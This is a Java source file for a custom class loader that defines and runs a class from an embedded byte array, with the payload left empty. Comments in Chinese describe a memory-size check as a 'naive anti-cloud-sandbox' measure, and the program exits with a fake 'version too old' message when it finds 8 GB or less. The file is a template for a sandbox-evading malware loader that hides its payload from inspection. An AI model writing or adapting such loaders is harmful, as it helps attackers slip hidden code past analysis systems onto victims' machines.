package org.mtl;

import com.sun.management.OperatingSystemMXBean;

import java.lang.management.ManagementFactory;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * @Author novy
 * @Date 2021/12/7 15:13
 * @Version 1.0
 */
public class Myloader extends ClassLoader{
    
    private static String testClassName = "";
    // 生成的字节码内容
    private static byte[] testClassBytes = new byte[]{};
    @Override
    public Class<?> findClass(String name){
        return defineClass(testClassBytes, 0, testClassBytes.length);
        // return super.findClass(name);
    }
    public static void main(String[] args){
        OperatingSystemMXBean osmb = (OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
        //如果目标小于8g就不运行了，幼稚版的防云沙箱，这个看着改，可以不要
        long cpu = (osmb.getTotalPhysicalMemorySize() / 1024/1024);
        if (cpu<=8192){
            System.out.println("版本过老，程序自动退出");
            System.exit(0);
        }
        // 创建自定义的类加载器
        Myloader loader = new Myloader();
        try {
            // 使用自定义的类加载器
            //findClass跟loadClass的双亲委派原则，因为前面testClassName是空，所以会用到findClass来加载testClassBytes
            Class testClass = loader.loadClass(testClassName);
            Object testInstance = testClass.newInstance();
//                String name = args[0];
            Method method = testInstance.getClass().getMethod("hello");
            method.invoke(testInstance);
            //  System.out.println(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
